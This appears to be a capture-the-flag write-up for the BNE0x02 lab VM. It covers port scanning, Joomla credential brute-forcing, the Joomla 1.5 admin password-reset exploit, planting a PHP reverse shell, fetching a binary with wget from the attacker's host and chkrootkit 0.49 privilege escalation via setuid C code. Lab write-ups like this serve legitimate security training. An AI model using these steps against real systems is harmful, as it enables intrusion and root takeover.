# BNE0x02
Initial recon shows a nearly all ports open and all of them sending the following response:
```html
HTTP/1.0 200 OK
Server: Apache/2.4.8 (Ubuntu)

<html>
<body> FUKU!</body>
</html>
```
What's interesting is that you don't event have to send a HTTP GET request. After a successful connection to a port the above response is returned. I was able to quickly hack together the following scanner which connects to all ports and sees if they send the above response.
```python
root@kali:~# cat fuku-scanner.py 
#!/usr/bin/env python2
from __future__ import print_function
import socket
import re
import subprocess
def getip():
        arpscan = subprocess.Popen(['arp-scan', '192.168.56.0/24', '-q'], stdout=subprocess.PIPE).communicate()[0]
        target = re.findall(b'((\d{1,3}\.){3}\d{1,3})', arpscan)[0][0]
        return(target)

target = getip()
print(target)
for port in range(1, 65536):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        payload = s.recv(1024)
        if 'FUKU' not in payload:
                print('\n[+] Port %s has a service running' % port)
                print(payload)
        else:
                print('.', end='')
        s.close()
```
After running the script for a short while, I came accross ports 22 and 13370 open. I noticed quickly after letting the script run for a short while that the server has been configured to change it's IP address everyone couple of minutes to an address in the 192.168.56.0/24 subnet.
```console
root@kali:~# ./fuku-scanner.py
192.168.56.127
.....................
[+] Port 22 has a service running
SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1
...................................................................................................................................................................................................................
......................................
[+] Port 13370 has a service running
```
I proceed to do a service scan with NMAP.
```console
root@kali:~# nmap -p22,13370 -sS -sV -O -Pn --script "(ssh* or http* or banner-plus) and not http-slowloris" --script-args=unsafe=1 192.168.56.243
Nmap scan report for 192.168.56.243
Host is up (0.00019s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
---8<---
13370/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
---8<--
| http-comments-displayer:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.243
|
---8<---
|     Path: http://192.168.56.243:13370/templates/rhuk_milkyway/css/template.css
|     Line number: 319
|     Comment:
|         /*** Joomla! specific content elements ***/
|
|     Path: http://192.168.56.243:13370/media/system/js/caption.js
|     Line number: 1
|     Comment:
|         /**
|         * @version            $Id: modal.js 5263 2006-10-02 01:25:24Z webImagery $
|         * @copyright  Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
|         * @license            GNU/GPL, see LICENSE.php
|         * Joomla! is free software. This version may have been modified pursuant
|         * to the GNU General Public License, and as distributed it includes or
|         * is derivative of works licensed under the GNU General Public License or
|         * other free or open source software licenses.
|         * See COPYRIGHT.php for copyright notices and details.
|         */
| http-enum:
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /logs/: Logs
|   /robots.txt: Robots file
|   /htaccess.txt: Joomla!
|   /templates/system/css/toolbar.css: Joomla!
|   /templates/beez/css/template_rtl.css: Joomla!
|   /cache/: Potentially interesting folder
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-grep:
|   (1) http://192.168.56.243:13370/:
|     (1) ip:
|       + 192.168.56.243
|   (1) http://192.168.56.243:13370/media/system/js/caption.js:
|     (1) email:
|_      + johan.janssens@joomla.org
| http-joomla-brute:
|   Accounts:
|     admin:password - Valid credentials
|     guest:password - Valid credentials
|     user:password - Valid credentials
|     web:password - Valid credentials
|     test:password - Valid credentials
|     netadmin:password - Valid credentials
|     webadmin:password - Valid credentials
|     sysadmin:password - Valid credentials
|     administrator:password - Valid credentials
|     root:iloveyou - Valid credentials
|_  Statistics: Performed 63 guesses in 8 seconds, average tps: 7
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 15 disallowed entries
| /administrator/ /cache/ /components/ /flag.txt
| /images/ /includes/ /installation/ /language/ /libraries/
|_/media/ /modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.10 (Ubuntu)
|_http-title: Welcome to the Frontpage
---8<---
MAC Address: 52:54:00:62:FF:C9 (QEMU virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.4 (95%), Linux 3.13 (94%), Linux 3.10 - 4.1 (93%), Linux 3.16 - 3.19 (93%), Android 5.0 - 5.1 (92%), Linux 2.6.32 (92%), Linux 3.2 - 3.10 (92%), Linux 3.2 - 3.16 (92%), Linux 2.6.32 - 3.10 (92%), Linux 3.13 - 3.16 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 336.03 seconds
```
Looking through the results we can quickly tell that OpenSSH is running on port 22 as expected. Apache is running on port 13370 and it's hosting a Joombla site. What's also interesting is that flag.txt entry in the robots.txt. Browsing to flag.txt reveals the first flag:
```
Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
Maybe you found it after getting a shell, by using a command like "find / -name flag.txt" ?
Random keyboard smash: J7&fVbh2kTy[JgS"98$vF4#;>mGcT
```
The first flag is ***J7&fVbh2kTy[JgS"98$vF4#;>mGcT***
After identifying that the site was using Joombla, I proceed to run joomscan to check if there were any vulnerabilities.
```console
root@kali:~# joomscan -u '192.168.56.132:13370'


 ..|''||   '|| '||'  '|'     |      .|'''.|  '||''|.
.|'    ||   '|. '|.  .'     |||     ||..  '   ||   ||
||      ||   ||  ||  |     |  ||     ''|||.   ||...|'
'|.     ||    ||| |||     .''''|.  .     '||  ||
 ''|...|'      |   |     .|.  .||. |'....|'  .||.


=================================================================
OWASP Joomla! Vulnerability Scanner v0.0.4
(c) Aung Khant, aungkhant]at[yehg.net
YGN Ethical Hacker Group, Myanmar, http://yehg.net/lab
Update by: Web-Center, http://web-center.si (2011)
=================================================================


Vulnerability Entries: 611
Last update: February 2, 2012

Use "update" option to update the database
Use "check" option to check the scanner update
Use "download" option to download the scanner latest version package
Use svn co to update the scanner and the database
svn co https://joomscan.svn.sourceforge.net/svnroot/joomscan joomscan


Target: http://192.168.56.132:13370

Server: Apache/2.4.10 (Ubuntu)


## Checking if the target has deployed an Anti-Scanner measure

[!] Scanning Passed ..... OK


## Detecting Joomla! based Firewall ...

[!] No known firewall detected!


## Fingerprinting in progress ...

~Generic version family ....... [1.5.x]

~1.5.x htaccess.txt revealed 1.5.0-stable(21-January-2008)
~1.5.x configuration.php-dist revealed 1.5.0-stable(21-January-2008)
~1.5.x adminlists.html revealed [1.5.0(stable) - 1.5.6]

* The Exact version found is 1.5.0-stable

## Fingerprinting done.


## 2 Components Found in front page  ##

 com_hdflvplayer         com_mailto




Vulnerabilities Discovered
==========================

---8<---
# 15
Info -> CoreComponent: Joomla Remote Admin Password Change Vulnerability
Versions Affected: 1.5.5 <=
Check: /components/com_user/controller.php
Argument "0-stable" isn't numeric in int at ./joomscan.pl line 2285, <JO> line 23.
Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
Vulnerable? Yes
---8<--

There are 20 vulnerable points in 34 found entries!

~[*] Time Taken: 17 sec
~[*] Send bugs, suggestions, contributions to joomscan@yehg.net
```
There were several vulnerabilities that were found but the admin password change vulnerability was the one I used to take over the site and upload my web shell. I was able to reset the admin password by following the instructions provided. With the admin password reset I attempted to upload a web shell using the built in [media manager](http://192.168.56.x:13370/administrator/index.php?option=com_media) but I was being blocked by a file extension whitelist. The white list was easily by passed by going to the [configuration section](http://192.168.56.x:13370/administrator/index.php?option=com_config) of the admin panel and adding the php extension to the whitelist and/or also disabling the whitelist. I was then able to upload my [php reverse shell](pentestmonkey.net/tools/web-shells/php-reverse-shell) and get an interactive shell. I initially tried to upload a web shell but it was getting caught by some sort of security check. I was initially going to try and obfuscate the script using gzinflate, base64_decode etc but after finding that my php reverse shell worked I moved on.
```console
root@kali:~# nc -lvvp 443
listening on [any] 443 ...
192.168.56.129: inverse host lookup failed: Unknown host
connect to [192.168.56.100] from (UNKNOWN) [192.168.56.129] 44952
haha! FUKU! Only root can run that command.
 21:58:13 up 1 day, 23:59,  0 users,  load average: 0.05, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
haha! FUKU! Only root can run that command.
/bin/sh: 0: can't access tty; job control turned off
$
```
The first thing I noticed was the "haha! FUKU! Only root can run that command." message instead of the results of "id" command. After a bit of digging I found out that several binaries on the system had been replaced by a shell script which prints that message. This was more of an annoyance than a real deterrent for me as I was able to use busybox for the command that had been replaced or using other methods. After a bit of looking around it was identified that server was running chkrootkit version 0.49 as root at a regular interval which was vulnerable to a (privledge escalation vulnerability)[https://www.exploit-db.com/exploits/33899/]. I was able to gain root by writing a small script name 'update' to /tmp which would chown a small executable as root:root and set the suid bit. All the executable does is set uid and gid to 0 and spawn a bash shell. On the server gcc has been replaced by a shell script, so I had to compile it on my Kali vm.
```c
root@kali:~p# cat setuid.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
        setuid(0); setgid(0); system("/bin/bash");
}
```
One thing that tripped me up was that I was compiling a 64bit binary when the server is running a 32bit operating system. On a Kali machine you'll have to install libc6-dev-i386 which will install the 32 libc libraries and compile the binary using ``gcc -m32 setuid.c -o setuid``
```console
$ wget http://192.168.56.100/setuid -O setuid
--2016-05-03 22:35:21--  http://192.168.56.100/setuid
Connecting to 192.168.56.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5136 (5.0K) [application/octet-stream]
Saving to: 'setuid'

     0K .....                                                 100% 1.65G=0s

2016-05-03 22:35:21 (1.65 GB/s) - 'setuid' saved [5136/5136]
$ echo chown root:root /tmp/setuid > /tmp/update
$ echo chmod 4755 /tmp/setuid >> /tmp/update
$ cat update
chown root:root /tmp/setuid
chmod 4755 /tmp/setuid
```
After a few minutes of waiting you'll notice that the binary is owned by root and that the SUID binary is set.
```console
$ ls -l
total 44
-rw-rw-rw- 1 www-data www-data     0 May  3 21:51 
-rwsr-xr-x 1 root     root      5136 May  3 22:34 setuid
drwx------ 3 root     root      4096 May  1 21:58 systemd-private-36d2f6755c93455d8c9f6bea28c8fa80-colord.service-6TrDJg
drwx------ 3 root     root      4096 May  1 21:58 systemd-private-36d2f6755c93455d8c9f6bea28c8fa80-rtkit-daemon.service-BrVEVI
drwx------ 3 root     root      4096 May  1 21:58 systemd-private-36d2f6755c93455d8c9f6bea28c8fa80-systemd-timesyncd.service-ZKyQrJ
-rwxrwxrwx 1 www-data www-data    51 May  3 23:26 update

$ ./setuid
busybox id
uid=0(root) gid=0(root) groups=33(www-data)
cd /root
ls
19700101
change_ip.sh
chkrootkit-0.49
cpp-4.9
flag.txt
fuku
g++-4.9
gcc
gcc-4.9
gcc-ar
gcc-ar-4.9
gcc-nm
gcc-nm-4.9
gcc-ranlib
gcc-ranlib-4.9
id
ifconfig
locate
mlocate
portspoof
python
python2.7
uname
which
whoami
cat flag.txt
Yep, this is a flag. It's worth over 9000 Internet points!
Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&*iuGf)8$d4gfh%4
```
The second flag is ***lkhI6u%RdFEtDjJKIuuiI7i&*iuGf)8$d4gfh%4***

### Thanks and credits
Thanks to Robert Winkel(@RobertWinkel) for creating the CTF. It was an interesting CTF as always especially the Joombla enumeration and scanning stuff.
